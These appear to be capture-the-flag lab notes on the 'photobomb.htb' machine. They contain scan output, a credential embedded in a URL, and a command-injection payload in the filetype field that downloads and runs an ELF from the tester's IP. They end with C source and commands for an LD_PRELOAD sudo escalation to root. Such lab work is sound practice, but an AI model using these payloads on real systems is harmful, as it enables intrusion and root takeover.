nmap -A -sV 10.10.11.182 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 20:39 EDT
Nmap scan report for 10.10.11.182
Host is up (0.085s latency).
Not shown: 978 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
32/tcp    filtered unknown
49/tcp    filtered tacacs
80/tcp    open     http           nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
427/tcp   filtered svrloc
1027/tcp  filtered IIS
1078/tcp  filtered avocent-proxy
1113/tcp  filtered ltp-deepspace
1122/tcp  filtered availant-mgr
2042/tcp  filtered isis
2701/tcp  filtered sms-rcinfo
2910/tcp  filtered tdaccess
4279/tcp  filtered vrml-multi-use
5102/tcp  filtered admeng
5510/tcp  filtered secureidprop
5815/tcp  filtered unknown
6007/tcp  filtered X11:7
8099/tcp  filtered unknown
9999/tcp  filtered abyss
12265/tcp filtered unknown
18101/tcp filtered unknown
49159/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1861.28 seconds

# modifier /etc/host dns

http://pH0t0:b0Mb!@photobomb.htb/printer

# nikto result
nikto -host http://photobomb.htb/printer -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.182
+ Target Hostname:    photobomb.htb
+ Target Port:        80
+ Start Time:         2022-10-17 20:55:25 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-cascade' found, with contents: pass
+ 26543 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2022-10-17 21:36:05 (GMT-4) (2440 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (nginx/1.18.0) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
- Sent updated info to cirt.net -- Thank you!

# nikto result page interessante
nikto  -host http://photobomb.htb/ -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.182
+ Target Hostname:    photobomb.htb
+ Target Port:        80
+ Start Time:         2022-10-17 20:56:35 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ Uncommon header 'x-cascade' found, with contents: pass
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 26392 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-10-17 21:38:58 (GMT-4) (2543 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (nginx/1.18.0) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
- Sent updated info to cirt.net -- Thank you!

# faille donwload photo ";" filetype, url encode pour payload

wget%20http%3A%2F%2F10.10.14.13%2FDesktop%2Fshelf.elf
png;chmod%20777%20shelf.elf
./shelf
wget%20http%3A%2F%2F10.10.14.13%2FDesktop%2Fyoo

# tuto LD_PRELOAD
https://c0nd4.medium.com/linux-sudo-ld-preload-privilege-escalation-7e1e17d544ec

# gcc payload LD_PRELOAD shell.so 

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/sh");
}

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
# result shell.so

# root payload
sudo LD_PRELOAD=/tmp/shell.so /opt/cleanup.sh